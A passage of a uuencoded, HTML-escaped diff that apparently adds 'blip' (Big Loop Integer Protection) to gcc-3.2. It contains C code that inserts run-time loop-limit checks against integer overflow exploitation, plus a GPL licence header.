M*B!I9B!S:6UP;&amp;4@97AP&lt;B!L;V]K(&amp;EN&lt;VED92XJ+PT-&quot;BL)&quot;6-A&lt;V4@4%)%
M1$5#4D5-14Y47T584%(Z#0T**PD)8V%S92!04D5)3D-214U%3E1?15A04CH-
M#0HK&quot;0EC87-E(%!/4U1$14-214U%3E1?15A04CH-#0HK&quot;0EC87-E(%!/4U1)
M3D-214U%3E1?15A04CH-#0HK#0T**PD)&quot;7)E=&#039;5R;B!B;&amp;EP7V9I;F1?9&amp;5C
M;&quot;A44D5%7T]015)!3D0@*&amp;]P+#`I*3L-#0HK&quot;0D)#0T**PD)+RH@:6X@8V%S
M92!L;V]P(&#039;9A&lt;B!N965D(&amp;-O;G9E&lt;G1I;VXL(&#039;=E(&#039;=I;&amp;P@9FEN9&quot;!S;VUE
M(`T-&quot;BL)&quot;2`J(&amp;YO&lt;&quot;!E&gt;&#039;!R97-S:6]N&lt;R`J+PT-&quot;BL)&quot;6-A&lt;V4@3D]07T58
M4%(Z#0T**PD)8V%S92!#3TY615)47T584%(Z#0T**PD)&quot;0T-&quot;BL)&quot;0ER971U
M&lt;FX@8FQI&lt;%]F:6YD7V1E8VPH5%)%15]/4$5204Y$(&quot;AO&lt;&quot;PP*2D[#0T**PD)
M#0T**PD)9&amp;5F875L=#H-#0HK&quot;0D)&lt;F5T=7)N($Y53$P[#0T**PE]#0T**WT-
M#0HK#0T**R\J(&amp;QO;VL@:6YS:61E(&amp;$@0T%,3%]%6%!2+&quot;!A;F0@9FEN9&quot;!T
M:&amp;4@9G5N8W1I;VX@;F%M92X@=&amp;AE;B!S96%R8V@@#0T**R`J(&amp;9U;F-T:6]N
M(&amp;YA;64@:6X@8FQI&lt;&quot;!L:7-T+&quot;!A;F0@8W)E871E(&amp;$@(FQO;W!?;&amp;EM:70B
M(&#039;-T=7)C=&quot;!U&lt;VEN9PT-&quot;BL@*B!T:&amp;4@3BUT:&quot;!P87)A;2!A&lt;R!L:6UI=&quot;P@
M8V]N&lt;W1A;G0@,&quot;!A&lt;R!C;W5N=&amp;5R+&quot;!A;F0@&lt;V5T(&amp;1I&lt;F5C=&amp;EO;B`-#0HK
M(&quot;H@=&amp;\@:6YC&lt;F5M96YT+B`J+PT-&quot;BMB;V]L#0T**V)L:7!?9FEN9%]C86QL
M7VQI;6ET&lt;RAC86QL+&#039;!A&lt;F%M&lt;RD-#0HK&quot;71R964)8V%L;#L-#0HK&quot;71R964)
M&lt;&amp;%R86US.PT-&quot;BM[#0T**PT-&quot;BL)=&#039;)E90EF=6YC7V1E8VPL&lt;&amp;%R86T[#0T*
M*PEI;G0)&quot;6DL&lt;&amp;%R86U?:6YD97@]+3$[#0T**PT-&quot;BL)+RH@=7!D871E(&#039;-T
M871I&lt;W1I8W,@8V]U;G1E&lt;G,@*B\-#0HK&quot;6)L:7!?&lt;W1A=&quot;YT;W1A;%]C:&amp;5C
M:W,K*SL-#0HK&quot;6)L:7!?&lt;W1A=&quot;YC86QL7V-H96-K&lt;RLK.PT-&quot;BL)#0T**PEI
M9B@A8V%L;&quot;!\?`T-&quot;BL)&quot;2%44D5%7T]015)!3D0H8V%L;&quot;PP*7Q\#0T**PD)
M5%)%15]#3T1%(&quot;A44D5%7T]015)!3D0@*&amp;-A;&amp;PL,&quot;DI(&quot;$]($%$1%)?15A0
M4B!\?`T-&quot;BL)&quot;2%44D5%7T]015)!3D0H5%)%15]/4$5204Y$(&quot;AC86QL+#`I
M+#`I*7L-#0HK&quot;0D-#0HK&quot;0EB;&amp;EP7W=A&lt;FYI;F&lt;H3D5?0T%,3&quot;PB8FQI&lt;#H@
M8V%L;&quot;!E&gt;&#039;!R(&amp;1O;G0@:&amp;%V92!A9&amp;1R97-S(&amp;5X&lt;&#039;(B*3L)#0T**PD)&lt;F5T
M=7)N(&amp;9A;&#039;-E.PT-&quot;BL)?0T-&quot;BL-#0HK&quot;69U;F-?9&amp;5C;&quot;`](%12145?3U!%
M4D%.1&quot;`H5%)%15]/4$5204Y$(&quot;AC86QL+#`I+#`I.PT-&quot;BL):68H(%12145?
M0T]$12`H9G5N8U]D96-L*2`A/2!&amp;54Y#5$E/3E]$14-,(&#039;Q\#0T**PD)(41%
M0TQ?3D%-12`H9G5N8U]D96-L*2!\?`T-&quot;BL)&quot;2$@241%3E1)1DE%4E]03TE.
M5$52(&quot;@@1$5#3%].04U%*&amp;9U;F-?9&amp;5C;&quot;DI*7L-#0HK#0T**PD)8FQI&lt;%]W
M87)N:6YG*$Y%7T-!3$PL(F)L:7`Z(&amp;-A;&amp;P@8GD@&lt;&amp;]I;G1E&lt;B!T;R!F=6YC
M=&amp;EO;B!N;W0@&lt;W5P&lt;&amp;]R=&amp;5D(BD[#0T**PD@(&quot;`)&lt;F5T=7)N(&amp;9A;&#039;-E.PT-
M&quot;BL)?0T-&quot;BL-#0HK#0T**PEF;W(H:3TP.R!S=&#039;)L96XH;&amp;]O&lt;%]L:6ME&lt;UMI
M72YF=6YC7VYA;64I(#X@,#MI*RLI&gt;PT-&quot;BL)&quot;6EF*&#039;-T&lt;F-M&lt;&quot;A)1$5.5$E&amp;
M24527U!/24Y415(@*$1%0TQ?3D%-12`H9G5N8U]D96-L*2DL#0T**PD)&quot;0D)
M;&amp;]O&lt;%]L:6ME&lt;UMI72YF=6YC7VYA;64I/3TP*7L-#0HK&quot;0D)#0T**PD)&quot;7!A
M&lt;F%M7VEN9&amp;5X(#T@;&amp;]O&lt;%]L:6ME&lt;UMI72YP87)A;5]I;F1E&gt;#L-#0HK&quot;0D)
M8G)E86L[#0T**PD)?0T-&quot;BL)?0T-&quot;BL)#0T**PDO*B!I9B!F=6YC=&amp;EO;B!N
M;W0@9F]U;F0@:6X@;&amp;]O&lt;%]L:6ME&lt;R!L:7-T(&#039;1H96X@9&amp;]N=&quot;!C;W5N=`T-
M&quot;BL)(&quot;H@:70@:6X@=&amp;AE(&amp;)L:7!?&lt;W1A=&quot;`J+PT-&quot;BL):68H&lt;&amp;%R86U?:6YD
M97@@/&quot;`P*7L-#0HK&quot;0EB;&amp;EP7W-T870N=&amp;]T86Q?8VAE8VMS+2T[#0T**PD)
M8FQI&lt;%]S=&amp;%T+F-A;&amp;Q?8VAE8VMS+2T[#0T**PD)&lt;F5T=7)N(&amp;9A;&#039;-E.PT-
M&quot;BL)?0T-&quot;BL)&quot;0D-#0HK#0T**PEP87)A;2`](&#039;!A&lt;F%M&lt;SL-#0HK&quot;69O&lt;BAI
M/3`[(&amp;D@/&quot;!P87)A;5]I;F1E&gt;&quot;`F)B!P87)A;3L@:2LK*7L-#0HK&quot;0EP87)A
M;2`](%12145?0TA!24X@*&#039;!A&lt;F%M*3L-#0HK&quot;7T-#0HK&quot;0T-&quot;BL):68H(7!A
M&lt;F%M*2!R971U&lt;FX@9F%L&lt;V4[#0T**PD-#0HK&quot;6QO;W!?;&amp;EM:70N;&amp;EM:70@
M/2!44D5%7U9!3%5%(&quot;AP87)A;2D[#0T**PT-&quot;BL)+RH@:68@&lt;&amp;%R86T@:7,@
M8V%L8W5L871E9&quot;!U&lt;VEN9R!A(&amp;9U;F-T:6]N+&quot;!D;VYT(&amp;EN8VQU9&amp;4@=&amp;AA
M=`T-&quot;BL)(&quot;H@97AP&lt;B!I;B!T:&amp;4@8VAE8VLL(&amp;ET&lt;R!W87D@=&amp;]O(&#039;)I&lt;VMY
M+B`J+PT-&quot;BL):68H5%)%15]3241%7T5&amp;1D5#5%,@*&amp;QO;W!?;&amp;EM:70N;&amp;EM
M:70I*7L-#0HK&quot;0EB;&amp;EP7W=A&lt;FYI;F&lt;H3D5?0T%,3&quot;PB8FQI&lt;#H@&lt;&amp;%R86T@
M&lt;V5E;7,@=&amp;\@:&amp;%V92!S:61E(&amp;5F9F5C=&#039;,B*3L-#0HK&quot;0ER971U&lt;FX@9F%L
M&lt;V4[&quot;0D-#0HK&quot;7T-#0HK&quot;0T-&quot;BL);&amp;]O&lt;%]L:6UI=&quot;YC;W5N=&amp;5R(#T@:6YT
M96=E&lt;E]Z97)O7VYO9&amp;4[#0T**R`@&quot;6QO;W!?;&amp;EM:70N9&amp;ER(#T@24Y#4D5-
M14Y4.PD-#0HK&quot;0T-&quot;BL)+RH@86QL(&#039;-E96US(&#039;1O(&amp;)E(&amp;]K+&quot;!W92!F;W5N
M9&quot;!T:&amp;4@;&amp;EM:71S+&quot;!A;F0@=V4@8V%N(`T-&quot;BL)(&quot;H@8V]N=&amp;EN=64@=VET
M:&quot;!E;6ET:6&lt;@=&amp;AE(&amp;)L:7`@8VAE8VLN(&quot;HO#0T**PD-#0HK&quot;7)E=&#039;5R;B!T
M&lt;G5E.PT-&quot;BM]#0T**PT-&quot;BL-#0HK+RH@3&amp;]O:R!I;G-I9&amp;4@82!L;V]P(&amp;-O
M;F1I=&amp;EO;BX@9FER&lt;W0@8VAE8VL@:68@8V]N9&amp;ET:6]N(&amp;ES(&#039;1O;R`-#0HK
M(&quot;H@8V]M&lt;&amp;QI8V%T960N(&amp;EF(&amp;ET(&amp;ES+&quot;!R971U&lt;FX@3E5,3&quot;`O+R!&amp;25A-
M12!R961U8V4@(F-O;7!L:6-A=&amp;5D(B!S970-#0HK(&quot;H-#0HK(&quot;H@9F]R(&amp;5A
M8V@@9&amp;5C;&quot;!I;B!T:&amp;4@8V]N9&amp;ET:6]N+&quot;!C:&amp;5C:R!I9B!D96-L(&amp;ES(&amp;UO
M9&amp;EF:65D(&amp;5I=&amp;AE&lt;@T-&quot;BL@*B!I;B!C;VYD(&amp;]R(&amp;5X&lt;&#039;(N(&amp;EF(&amp;ET)W,@
M;6]D:69I960@8V]N&lt;VED97(@:70@87,@=&amp;AE(&amp;-O=6YT97(N#0T**R`J(&amp;EF
M(&amp;UO&lt;F4@=&amp;AE;B!O;F4@8V]U;G1E&lt;B!F;W5N9&quot;!R971U&lt;FX@3E5,3&quot;X@*B\-
M#0HK#0T**V)O;VP-#0HK8FQI&lt;%]F:6YD7VQO;W!?=F%R&lt;RAC;VYD+&amp;5X&lt;&#039;(I
M#0T**PET&lt;F5E&quot;6-O;F0[#0T**PET&lt;F5E&quot;65X&lt;&#039;([#0T**WL-#0HK#0T**PET
M&lt;F5E&quot;61E8VP],#L-#0HK&quot;6EN=`D):2QN=6U?;6]D:69I960],#L-#0HK#0T*
M*PEI9B@A8V]N9&quot;D@&lt;F5T=7)N(&amp;9A;&#039;-E.PT-&quot;BL)#0T**PDO*B!F:7)S=&quot;!V
M97)S:6]N(&#039;=I;&amp;P@&lt;W5P&lt;&amp;]R=&quot;!O;FQY(&#039;9E&lt;GD@&lt;VEM&lt;&amp;QE(&amp;-O;F1I=&amp;EO
M;G,@*B\)#0T**PES=VET8V@H5%)%15]#3T1%(&quot;AC;VYD*2E[#0T**PD)8V%S
M92!,5%]%6%!2.@T-&quot;BL)&quot;6-A&lt;V4@3$5?15A04CH-#0HK&quot;0EC87-E($=%7T58
M4%(Z#0T**PD)8V%S92!&#039;5%]%6%!2.@T-&quot;BL)&quot;6-A&lt;V4@15%?15A04CH-#0HK
M&quot;0EC87-E($Y%7T584%(Z#0T**PT-&quot;BL)&quot;0DO*B!F:6YD(&amp;1E8VP@=VEL;&quot;!G
M970@86X@;W!E&lt;F%N9&quot;!A;F0@&lt;F5T=7)N(&#039;1H92`B;6%I;B(-#0HK&quot;0D)(&quot;H@
M9&amp;5C;&quot;!T:&amp;%T(&#039;)E&lt;&#039;)E&lt;W0@:70N(`T-&quot;BL)&quot;0D@*B`-#0HK&quot;0D)(&quot;H@4VEN
M8V4@=&amp;AI&lt;R!O&lt;&amp;5R86YD(&amp;ES(&#039;!A&lt;G0@;V8@=VAA=&quot;!W92!H;W!E(&amp;$@8V]U
M;G1E&lt;@T-&quot;BL)&quot;0D@*B!C;VYD:71I;VXL(&amp;ET&lt;R!G;VEN9R!T;R!B92!E:71H
M97(@=F%R+W!A&lt;F%M(&amp;1E8VP@;W(@#0T**PD)&quot;2`J(&amp;%N(&amp;5X&lt;&#039;(@=VAI8V@@
M;W5R(&#039;)E&lt;75E&lt;W1E9&quot;!D96-L(&amp;ES(&#039;!A&lt;G0@;V8N(&quot;HO#0T**PD)#0T**PT-
M&quot;BL)&quot;0EF;W(H:3TP.R!I(#P@,CL@:2LK*7L-#0HK&quot;0D-#0HK&quot;0D)&quot;61E8VP@
M/2!B;&amp;EP7V9I;F1?9&amp;5C;&quot;A44D5%7T]015)!3D0@*&amp;-O;F0L:2DI.PD)&quot;0T-
M&quot;BL)&quot;0D):68H(61E8VPI&gt;PT-&quot;BL)&quot;0D)&quot;6)L:7!?=V%R;FEN9RA314Q&amp;7T-(
M14-++`T-&quot;BL)&quot;0D)&quot;0D)(F)L:7`Z(&amp;-A;G0@9FEN9&quot;!L;V]P(&amp;1E8VP@:6X@
M8V]N9&amp;ET:6]N(BD[#0T**PD)&quot;0D)+RH@8V]N9&amp;ET:6]N(&#039;1O;R!C;VUP;&amp;5X
M+&quot;!R971U&lt;FX@*B\-#0HK&quot;0D)&quot;0ER971U&lt;FX@9F%L&lt;V4[#0T**PD)&quot;0E]#0T*
M*PT-&quot;BL)&quot;0D)+RH@8VAE8VL@:68@9&amp;5C;&quot;!I&lt;R!M;V1I9FEE9&quot;X@=V4@:&amp;]P
M92!T;R!G970@80T-&quot;BL)&quot;0D)(&quot;H@;6]D:69I8V%T:6]N(&#039;-U8V@@87,@:6YC
M&lt;F5M96YT(&amp;]R(&amp;1E8W)E;65N=`T-&quot;BL)&quot;0D)(&quot;H@&lt;VEN8V4@=V4@:&amp;%V92!T
M;R!K;F]W(&#039;1H92!L;V]P(&amp;1I&lt;F5C=&amp;EO;B`J+PT-&quot;BL)&quot;0D):68H*&amp;)L:7!?
M9&amp;5C;%]M;V1I9FEE9&quot;AD96-L+&amp;-O;F0I(&#039;Q\#0T**PD)&quot;0D)(&amp;)L:7!?9&amp;5C
M;%]M;V1I9FEE9&quot;AD96-L+&amp;5X&lt;&#039;(I*2E[#0T**PD)&quot;0D)#0T**PD)&quot;0D);G5M
M7VUO9&amp;EF:65D*RL[#0T**PD)&quot;0D);&amp;]O&lt;%]L:6UI=&quot;YC;W5N=&amp;5R(#T@9&amp;5C
M;#L-#0HK&quot;0D)#0T**PD)&quot;0D)#0T**PD)&quot;0E]#0T**PD)&quot;0DO*B!I9B!N;W0@
M;6]D:69I960@;6%Y8F4@:71S(&#039;1H92!L:6UI=&quot;`N&lt;V%V92!I=&quot;`-#0HK&quot;0D)
M&quot;2`J(&amp;EN(&amp;-A&lt;V4@=&amp;AA=&quot;!W92!W:6QL(&amp;9I;F0@;W1H97(@87,@8V]U;G1E
M&lt;B`J+PT-&quot;BL)&quot;0D)96QS97L-#0HK&quot;0D)&quot;0EL;V]P7VQI;6ET+FQI;6ET(#T@
M9&amp;5C;#L-#0HK&quot;0D)&quot;7T-#0HK&quot;0D)?0D-#0HK&quot;0D)#0T**PD)&quot;6EF*&amp;YU;5]M
M;V1I9FEE9&quot;`]/2`Q*7L-#0HK&quot;0D)&quot;7)E=&#039;5R;B!T&lt;G5E.PT-&quot;BL)&quot;0E]#0T*
M*PD)&quot;0T-&quot;BL)&quot;0DO*B!W92!D:61N=&quot;!F;W5N9&quot;!O;F4@*&amp;%N9&quot;!O;FQY(&amp;]N
M92D@;6]D:69I960@9&amp;5C;&quot;X@#0T**PD)&quot;2`J(&#039;-O(&#039;=E(&amp;1O;G0@:VYO=R!W
M:&amp;EC:&quot;!I&lt;R!T:&amp;4@;&amp;EM:70@*&amp;EF(&amp;%T(&amp;%L;&quot;!E&gt;&amp;ES=&quot;D@*B\-#0HK&quot;0D)
M:68H;G5M7VUO9&amp;EF:65D(#T](#`I&gt;PT-&quot;BL)&quot;0D)8FQI&lt;%]W87)N:6YG*%-%
M3$9?0TA%0TLL#0T**PD)&quot;0D)(F)L:7`Z(&#039;=H:6-H(&amp;QO;W`@=F%R(&amp;ES(&amp;UO
M9&amp;EF:65D/R`H8F]D&gt;2!N;W0@&lt;V5A&lt;F-H960I(BD[#0T**PD)&quot;7T-#0HK&quot;0D)
M96QS97L-#0HK&quot;0D)&quot;6)L:7!?=V%R;FEN9RA314Q&amp;7T-(14-++`T-&quot;BL)&quot;0D)
M&quot;2)B;&amp;EP.B!M;W)E(&#039;1H96X@;VYE(&#039;9A&lt;B!I&lt;R!M;V1I9FEE9&quot;P@=VAO(&amp;ES
M(&amp;-O=6YT97(_(BD[#0T**PD)&quot;0D-#0HK&quot;0D)?0T-&quot;BL)&quot;0ER971U&lt;FX@9F%L
M&lt;V4[#0T**PD)&quot;0T-&quot;BL)&quot;0T-&quot;BL)&quot;61E9F%U;&#039;0Z#0T**PD)&quot;6)L:7!?=V%R
M;FEN9RA314Q&amp;7T-(14-++`T-&quot;BL)&quot;0D)&quot;2)B;&amp;EP.B!C;VYD:71I;VX@:7,@
M=&amp;]O(&amp;-O;7!L97@@9F]R(&#039;1H:7,@=F5R&lt;VEO;B(I.PT-&quot;BL)&quot;0ER971U&lt;FX@
M9F%L&lt;V4[#0T**PE]#0T**PD-#0HK?0T-&quot;BL-#0HK#0T**R\J(&amp;-H96-K(&amp;9O
M&lt;B!L;V]P(&amp;QI;6ET&lt;RX@:68@;&amp;]O&lt;&quot;!S965M&lt;R!T;R!B92!A(&amp;-O=6YT(&amp;QO
M;W`L(`T-&quot;BL@*B!E;6ET(&amp;-O9&amp;4@=&amp;\@8VAE8VL@;&amp;]O&lt;&quot;!C;W5N=&amp;5R(&amp;EN
M(&#039;)U;BUT:6UE+B!T:&amp;%T(&amp;-O9&amp;4@=VEL;`T-&quot;BL@*B!M86ME(&#039;-U&lt;F4@=&amp;AE
M(&amp;-O=6YT97(@:7,@;F]T(&#039;1O;R!B:6&lt;@*&amp;%S(&#039;)E&lt;W5L=&quot;!O9B!I;G0@;W9E
M&lt;F9L;W&lt;-#0HK(&quot;H@97AP;&amp;]I=&amp;%T:6]N*2`J+PT-&quot;BL-#0HK(&quot;`@#0T**W1R
M964-#0HK8FQI&lt;%]C:&amp;5C:U]L;V]P7VQI;6ET(&quot;AT*0T-&quot;BL@(&quot;`@(&#039;1R964@
M=#L-#0HK&gt;PT-&quot;BL)+RH@3&amp;]O&lt;&quot;!P87)T&lt;R`J+PT-&quot;BL)=&#039;)E90ER97-U;&#039;0]
M=#L-#0HK#0T**PDO*B!)9B!W92!A&lt;F4@;F]T(&amp;%S:V5D(&#039;1O(&amp;)L:7`L(&#039;)E
M=&#039;5R;B!T:&amp;4@=&#039;)E92!W92!G;W0@*B\-#0HK&quot;6EF*&quot;%F;&amp;%G7V)L:7`I(&#039;)E
M=&#039;5R;B!R97-U;&#039;0[#0T**PT-&quot;BL)+RH@268@=&amp;AE(&#039;1R964@=V4@9V]T(&amp;ES
M(&amp;YU;&amp;P@=&amp;AE;B!W92!C86YT(&amp;1O(&amp;UU8V@@*B\-#0HK&quot;6EF*&quot;%T*0ER971U
M&lt;FX@&lt;F5S=6QT.PT-&quot;BL-#0HK&quot;2\J(&amp;EN:71I86QI&gt;F4@;&amp;]O&lt;%]L:6UI=&quot;!G
M;&amp;]B86P@*B\-#0HK&quot;6QO;W!?;&amp;EM:70N&lt;W1M=&quot;`](&#039;0[#0T**PEL;V]P7VQI
M;6ET+F-O=6YT97(@/2!.54Q,.PT-&quot;BL);&amp;]O&lt;%]L:6UI=&quot;YL:6UI=&quot;`]($Y5
M3$P[#0T**PEL;V]P7VQI;6ET+F1I&lt;B`](%5.2TY/5TX[#0T**PT-&quot;BL-#0HK
M&quot;0T-&quot;BL)#0T**PES=VET8V@H5%)%15]#3T1%(&quot;AT*2E[#0T**PD-#0HK&quot;2\J
M(&amp;1E&lt;&amp;5N9&amp;EN9R!O9B!L;V]P(&#039;1Y&lt;&amp;4L(&amp;5X=&#039;)A8W0@=&amp;AE(&amp;QO;W`@&lt;W1M
M=&#039;,@86YD(&amp;5X&lt;&#039;)S#0T**PD@*B!L;V]P(&amp;-O;F1I=&amp;EO;B!W:6QL(&amp;AE;&#039;`@
M=7,@:61E;G1I9GD@=&amp;AE(&amp;QO;W`@8V]U;G1E&lt;B!V87(-#0HK&quot;2`J(&#039;=E(&#039;=I
M;&amp;P@;&amp;%T97(@;&amp;]O:R!I;B!C;VYD(&amp;ET&lt;V5L9B!A;F0@=&amp;AE(&amp;9O&lt;E]E&gt;&#039;!R
M(&amp;9O&lt;B`-#0HK&quot;2`J(&amp;UO9&amp;EF:6-A=&amp;EO;B!O9B!V87)S(&amp;]F(&amp;-O;F1I=&amp;EO
M;BX@#0T**PD@*@T-&quot;BL)(&quot;H@:68@;6]D:69I8V%T:6]N(&amp;9O=6YD(&amp;%N9&quot;!L
M;V]K(&amp;QI:V4@82`B8V]U;G0B(&amp;UO9&amp;EF:6-A=&amp;EO;B`-#0HK&quot;2`J(&quot;AI+F4N
M(&quot;LK+&quot;TM+&quot;L]+&quot;H]+BX@971C*2!W92!W:6QL(&amp;MN;W&lt;@:71S(&amp;$@(F-O=6YT
M(B!L;V]P+@T-&quot;BL)(&quot;H@&quot;0T-&quot;BL)(&quot;H@;F5X=&quot;!S=&amp;5P+&quot;!I&lt;R!T;R!I9&amp;5N
M=&amp;EF&gt;2!C;VYD:71I;VX@97AP&lt;F5S:6]N+B!A;F0@=&amp;\@96UI=`T-&quot;BL)(&quot;H@
M8V]D92!T;R!C:&amp;5C:R!L:6UI=&quot;!I;B!R=6YT:6UE+&quot;!B969O&lt;F4@;&amp;]O&lt;&quot;!S
M=&amp;%R=&quot;!E&gt;&amp;5U8W1I;VX@(&quot;HO#0T**PT-&quot;BL)8V%S92!&amp;3U)?4U1-5#H-#0HK
M&quot;0EB;&amp;EP7W-T870N9F]R7V-H96-K&lt;RLK.PT-&quot;BL)&quot;6)L:7!?&lt;W1A=&quot;YT;W1A
M;%]C:&amp;5C:W,K*SL-#0HK&quot;0D)#0T**PD):68H8FQI&lt;%]F:6YD7VQO;W!?=F%R
M&lt;RA&amp;3U)?0T].1&quot;`H=&quot;DL1D]27T584%(@*&#039;0I*2D-#0HK&quot;0D):68H8FQI&lt;%]E
M;6ET7V9O&lt;E]L;V]P7V-H96-K&lt;RAT*2E[#0T**PD)&quot;0EB;&amp;EP7W-T870N=&amp;]T
M86Q?96UI=&#039;,K*SL-#0HK&quot;0D)&quot;6)L:7!?&lt;W1A=&quot;YF;W)?96UI=&#039;,K*SL-#0HK
M&quot;0D)?0T-&quot;BL-#0HK&quot;0EB&lt;F5A:SL-#0HK&quot;6-A&lt;V4@5TA)3$5?4U1-5#H-#0HK
M&quot;0EB;&amp;EP7W-T870N=VAI;&amp;5?8VAE8VMS*RL[#0T**PD)8FQI&lt;%]S=&amp;%T+G1O
M=&amp;%L7V-H96-K&lt;RLK.PT-&quot;BL-#0HK&quot;0EI9BAB;&amp;EP7V9I;F1?;&amp;]O&lt;%]V87)S
M*%=(24Q%7T-/3D0@*&#039;0I+$Y53$Q?5%)%12DI#0T**PD)&quot;6EF*&amp;)L:7!?96UI
M=%]W:&amp;EL95]L;V]P7V-H96-K&lt;R@I*7L-#0HK&quot;0D)&quot;6)L:7!?&lt;W1A=&quot;YT;W1A
M;%]E;6ET&lt;RLK.PT-&quot;BL)&quot;0D)8FQI&lt;%]S=&amp;%T+G=H:6QE7V5M:71S*RL[#0T*
M*PD)&quot;7T-#0HK&quot;0T-&quot;BL)&quot;6)R96%K.PT-&quot;BL)8V%S92!#04Q,7T584%(Z#0T*
M*PD)#0T**PD):68H8FQI&lt;%]F:6YD7V-A;&amp;Q?;&amp;EM:71S*&#039;0L5%)%15]/4$52
M04Y$(&quot;AT+#$I*2D-#0HK&quot;0D)&lt;F5S=6QT(#T@8FQI&lt;%]E;6ET7V-A;&amp;Q?8VAE
M8VMS*&#039;0I.PD)#0T**PT-&quot;BL)&quot;6EF*&#039;)E&lt;W5L=&quot;`A/2!T*7L-#0HK&quot;0D)8FQI
M&lt;%]S=&amp;%T+G1O=&amp;%L7V5M:71S*RL[#0T**PD)&quot;6)L:7!?&lt;W1A=&quot;YC86QL7V5M
M:71S*RL[#0T**PD)?0T-&quot;BL)&quot;0T-&quot;BL)&quot;6)R96%K.PD-#0HK&quot;61E9F%U;&#039;0Z
M#0T**PD)&lt;F5T=7)N(&#039;)E&lt;W5L=#L-#0HK&quot;7T-#0HK#0T**PER971U&lt;FX@&lt;F5S
M=6QT.PT-&quot;BL)#0T**WT-#0ID:69F(&quot;U.=7(@9V-C+3,N,B]G8V,O8FQI&lt;&quot;YH
M(&amp;=C8RTS+C(M8FQI&lt;&quot;]G8V,O8FQI&lt;&quot;YH#0HM+2T@9V-C+3,N,B]G8V,O8FQI
M&lt;&quot;YH&quot;5=E9&quot;!$96,@,S$@,38Z,#`Z,#`@,3DV.0T**RLK(&amp;=C8RTS+C(M8FQI
M&lt;&quot;]G8V,O8FQI&lt;&quot;YH&quot;4UO;B!$96,@(#(@,3DZ-#(Z,SD@,C`P,@T*0$`@+3`L
M,&quot;`K,2PY.2!`0`T**R\J#0HK#0HK&quot;4)I9R!,;V]P($EN=&amp;5G97(@4&#039;)O=&amp;5C
M=&amp;EO;B`M($$N2RY!(&quot;)B;&amp;EP(@T**PT**PEB;&amp;EP(&amp;ES(&amp;$@&lt;&amp;%T8V@@9F]R
M(&#039;1H92!G8V,@8V]M&lt;&amp;EL97(L(&#039;=H:6-H(&amp;1E=&amp;5C=&quot;!T:&amp;4@97AP;&amp;]I=&amp;%T
M:6]N#0HK&quot;6]F(&quot;AP=6)L:6-L&gt;2D@=6YK;F]W;B!I;G1E9V5R(&amp;]V97)F;&amp;]W
M(&amp;%N9&quot;!S:6=N(&#039;9U;&amp;YE&lt;F%B:6QI=&amp;EE&lt;RX-&quot;BL-&quot;BL@(&quot;`-&quot;BM4:&amp;ES(&amp;9I
M;&amp;4@:7,@&lt;&amp;%R=&quot;!O9B!&#039;3E4@0T,N#0HK#0HK1TY5($-#(&amp;ES(&amp;9R964@&lt;V]F
M=&#039;=A&lt;F4[(&#039;EO=2!C86X@&lt;F5D:7-T&lt;FEB=71E(&amp;ET(&amp;%N9&quot;]O&lt;B!M;V1I9GD-
M&quot;BMI=&quot;!U;F1E&lt;B!T:&amp;4@=&amp;5R;7,@;V8@=&amp;AE($=.52!&#039;96YE&lt;F%L(%!U8FQI
M8R!,:6-E;G-E(&amp;%S(&#039;!U8FQI&lt;VAE9&quot;!B&gt;0T**W1H92!&amp;&lt;F5E(%-O9G1W87)E
M($9O=6YD871I;VX[(&amp;5I=&amp;AE&lt;B!V97)S:6]N(#(L(&amp;]R(&quot;AA=&quot;!Y;W5R(&amp;]P
M=&amp;EO;BD-&quot;BMA;GD@;&amp;%T97(@=F5R&lt;VEO;BX-&quot;BL-&quot;BM&#039;3E4@0T,@:7,@9&amp;ES
M=&#039;)I8G5T960@:6X@=&amp;AE(&amp;AO&lt;&amp;4@=&amp;AA=&quot;!I=&quot;!W:6QL(&amp;)E(&#039;5S969U;&quot;P-
M&quot;BL)8G5T(%=)5$A/550@04Y9(%=!4E)!3E19.R!W:71H;W5T(&amp;5V96X@=&amp;AE
M(&amp;EM&lt;&amp;QI960@=V%R&lt;F%N=&#039;D@;V8-&quot;BL)34520TA!3E1!0DE,2519(&amp;]R($9)
M5$Y%4U,@1D]2($$@4$%25$E#54Q!4B!055)03U-%+B`@4V5E(&#039;1H90T**PE&#039;
M3E4@1V5N97)A;&quot;!0=6)L:6,@3&amp;EC96YS92!F;W(@;6]R92!D971A:6QS+@T*
M*PT**PE9;W4@&lt;VAO=6QD(&amp;AA=F4@&lt;F5C96EV960@82!C;W!Y(&amp;]F(&#039;1H92!&#039;
M3E4@1V5N97)A;&quot;!0=6)L:6,@3&amp;EC96YS90T**PEA;&amp;]N9R!W:71H($=.52!#
M0SL@&lt;V5E(&#039;1H92!F:6QE($-/4%E)3D&lt;N(&quot;!)9B!N;W0L(&#039;=R:71E(&#039;1O#0HK
M&quot;71H92!&amp;&lt;F5E(%-O9G1W87)E($9O=6YD871I;VXL(#4Y(%1E;7!L92!0;&amp;%C
M92`M(%-U:71E(#,S,&quot;P-&quot;BL)0F]S=&amp;]N+&quot;!-02`P,C$Q,2TQ,S`W+&quot;!54T$N
M(&quot;`J+PT**PT**R-D969I;F4@0DQ)4%]-05@),&#039;@Q,#`P,#`P,&quot;`O*B`R-38@
M34(@&lt;V5E;7,@=V%Y(&#039;1O;R!M=6-H(&amp;)I9R!L;V]P+BXN*B\-&quot;BL-&quot;BMT&gt;7!E
M9&amp;5F(&amp;5N=6T@;&amp;]O&lt;%]D:7(-&quot;BM[#0HK&quot;55.2TY/5TY?1$E2+&quot;\J(&#039;=E(&amp;-A
M;FYO=&quot;!T96QL(&amp;QO;W`@9&amp;ER96-T:6]N(&quot;HO#0HK&quot;4E.0U)%345.5&quot;P)+RH@
M;&amp;]O&lt;&quot;!I&lt;R!G;VEN9R!U&lt;&quot;`J+PT**PE$14-214U%3E0)+RH@;&amp;]O&lt;&quot;!I&lt;R!G
M;VEN9R!D;W=N(&quot;HO#0HK?0T**VQO;W!?9&amp;ER.PT**PT**W1Y&lt;&amp;5D968@96YU
M;2!B;&amp;EP7W=A&lt;FYI;F=S#0HK&gt;PT**PE314Q&amp;7T-(14-++`DO*B!U&lt;VEN9R!T
M:&amp;4@5%)%12!O8FIE8W0@9FEN9&quot;!O=70@=&amp;AE(&#039;)I9VAT#0HK&quot;0D)&quot;2`@(&#039;=A
M&lt;FYI;F&lt;@9FQA9R`J+PT**PE.15]&amp;3U(L&quot;0DO*B!W87)N(&amp;YO=&quot;!E;6ET:6YG
